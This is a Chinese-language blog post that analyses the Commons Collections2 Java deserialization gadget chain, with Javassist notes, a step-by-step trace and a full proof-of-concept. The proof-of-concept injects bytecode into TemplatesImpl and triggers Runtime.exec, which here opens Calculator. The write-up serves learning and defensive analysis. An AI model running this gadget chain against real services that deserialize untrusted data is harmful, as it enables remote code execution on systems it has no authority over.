Commons Collections2利用链调试分析
2022-04-06 11:08:02

Commons Collections2

0x00 前言

调试完CC1，由于高版本JDK8u71修改了AnnotationInvocationHandler的readObject方法导致CC1无法在高版本利用，于是就诞生了CC2，看了CC2的利用链中使用的不再是AnnotationInvocationHandler触发，下面先看一下yso的利用链：

/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */


CC2使用了Javessist和PriorityQueue来构造利用链，其中有一个点就是在调试完CC1后直接用了CC1的环境调试CC2会报错，后面查了一下是因为CC1的commons-collections3中的TransformingComparator没有实现Serializable接口所以不可以被序列化，但是在commons-collections4中是可以的，也就是说CC2是一条可以在高版本jdk利用但是前提是用了commons-collections4。

0x01 前置学习

首先让我们看一下Javassist是个啥东东：

Javassist

Javassist一个开源的分析、编辑、创建Java字节码的类库，也就是说他可以直接编辑创建Java的字节码文件(.class)。

  * ClassPool：Javassist的类池，可以把它理解成一个容器，可以控制所操作的类。

  * CtClass：它提供了类的一些操作，比如动态编辑类的字段、构造器、类的继承和实现等等。

  * CtField：类的属性，可以用它去编辑创建已有或新的类属性。

  * CtMethod：类的方法，可以使用它创建新方法，修改访问修饰符和方法体的代码。

下面是几个常用的操作：

ClassPool pool = ClassPool.getDefault();  //默认的类库
CtClass oldclass = pool.get("com.test.testclass");  //加载一个已知的类，get参数必须是全量的类名
CtClass newclass = pool.makeClass("com.test.newclass")  // 创建一个新类，同样必须是全量类名
oldclass.setSuperclass(pool.get(class.getName())) //设置需要继承的类

CtField oldfield = oldclass.getDeclaredField("name")  //获取一个已知类属性
CtField newfield = new CtField(CtClass.intType,"age",oldclass)  //添加一个新的类成员变量
newfield.setModifiers(Modifier.PUBLIC)  //设置类的访问修饰符
oldclass.addField(newfield)  //将属性添加到类中

CtMethod oldmethod = oldclass.getDeclaredMethod("hello")   //获取已知的方法
CtMethod newmethod = new CtMethod(CtClass.intType,"calc",new CtClass[]{CtClass.intType,CtClass.intType},oldclass)  //创建新的方法
oldmethod.setModifiers(Modifier,PUBLIC)  //设置方法的访问修饰符
oldclass.addMethod(newmethod)   //将新的方法添加到类中
newmethod.setBody("return $1 + $2;");   //方法体内容$1 $2分别代表第一个第二个参数

CtConstructor oldconstructor = oldclass.getDeclaredConstructor()     //获取已知的构造方法
newconstructor =CtNewConstructor.make("public Test(int age){this age = age;}",oldclass)   //直接创建构造方法
CtConstructor constructor = oldclass.makeClassInitializer()   //创建空类初始化器
CtConstructor newconstructor = new CtConstructor(new CtClass[]{CtClass.intType},oldclass)  //创建新的构造方法
newconstructor.setBody("this.age=$1")
oldclass.addConstructor(newconstructor)
oldclass.classmakeClassInitializer()  //创建static代码块


0x02 分析

首先看一下PriorityQueue的reaObject这个入口点

在这个readObject中将可控的恶意类传给了可控的queue，并且下面调用了heapify方法。我们看一下heapify方法

heapify方法又调用了siftDown，

siftDown这里判断了comparator是否为空，不为空进入siftDownUsingComparator，这里比较器comparator去调用compare，这里通过我们构造将comparator设置为TransformingComparator的comparator，就会进入后面的调用

看一下实现这个接口方法的类TransformingComparator，这个compare调用了transformer的transform方法，方法接收的参数就是我们构造的templatesimpl


继续跟进defineTransletClasses这里将我们之前构造的恶意类的byte数组传给_class.

下面这里调用了getTransletInstance方法去实例化了_class

这里实例化之后直接弹出了计算器也就是执行了我们的恶意代码，是因为我们在创建恶意代码类的时候生成的是静态代码块。

0x03 POC

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;


public class CC2 {
    public static void main(String[] args) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        ClassPool classPool=ClassPool.getDefault();
        classPool.appendClassPath(AbstractTranslet);
        CtClass evil = classPool.makeClass("evil");
        evil.setSuperclass(classPool.get(AbstractTranslet));     evil.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\");"); 
        byte[] bytes = evil.toBytecode();

        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor().newInstance();
        Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");
        field.setAccessible(true);
        field.set(templatesImpl,new byte[][]{bytes});

        Field field1=templatesImpl.getClass().getDeclaredField("_name");
        field1.setAccessible(true);
        field1.set(templatesImpl,"test");

        InvokerTransformer transformer=new InvokerTransformer("newTransformer",null,null);
        TransformingComparator comparator =new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(2); //至少需要两个元素才可以进行比较，后面会被templatesImpl替换掉

        Field field2=queue.getClass().getDeclaredField("comparator");
        field2.setAccessible(true);
        field2.set(queue,comparator);

        Field field3=queue.getClass().getDeclaredField("queue");
        field3.setAccessible(true);
        field3.set(queue,new Object[]{templatesImpl,templatesImpl});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(barr);
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream =new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        inputStream.readObject();

    }
}


0x04 总结

调试完总结一下利用链的思路：

PriorityQueue#readObject-->PriorityQueue#heapify-->PriorityQueue#siftDown-->PriorityQueue#siftDownUsingComparator-->TransformingComparator#compare-->InvokerTransformer#transform-->TransformerImpl#getTransletInstance-->evil.newInstance-->Runtime#exec


关于TemplatesImpl的defineclass利用还是很经典的，后面很多地方会用到，正好这条链又让自己加深了一下印象。
